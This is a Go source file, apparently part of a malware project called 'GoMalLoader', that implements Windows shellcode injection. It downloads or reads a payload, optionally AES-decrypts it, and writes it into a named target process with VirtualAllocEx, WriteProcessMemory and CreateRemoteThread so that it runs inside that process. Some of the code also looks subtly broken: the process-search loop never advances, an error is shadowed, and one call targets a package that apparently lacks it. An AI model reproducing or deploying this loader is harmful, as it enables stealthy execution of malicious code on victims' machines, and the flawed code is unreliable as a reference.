//go:build windows

package loader

import (
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"GoMalLoader/utils"
)

type windowsRemoteInjector struct{}

func NewRemoteInjector() RemoteInjector {
	return &windowsRemoteInjector{}
}

func (l *windowsRemoteInjector) Inject(cfg LoaderConfig) error {
	var payload []byte
	var err error

	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}

	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	procHandle := findAndOpenProcess(cfg.TargetProcess)
	remoteAddr, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
		uintptr(procHandle), 0, uintptr(len(payload)), 0x3000, 0x40)

	var written uintptr
	syscall.WriteProcessMemory(procHandle, remoteAddr, &payload[0], uintptr(len(payload)), &written)

	thread, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateRemoteThread").Call(
		uintptr(procHandle), 0, 0, remoteAddr, 0, 0, 0)

	syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Call(thread, 0xFFFFFFFF)
	return nil
}

func findAndOpenProcess(name string) syscall.Handle {
	snapshot, _ := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	for syscall.Process32First(snapshot, &entry) == nil {
		exe := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(exe, name) {
			handle, err := syscall.OpenProcess(syscall.PROCESS_ALL_ACCESS, false, entry.ProcessID)
			if err == nil {
				return handle
			}
		}
	}
	log.Fatalf("target process not found: %s", name)
	return 0
}
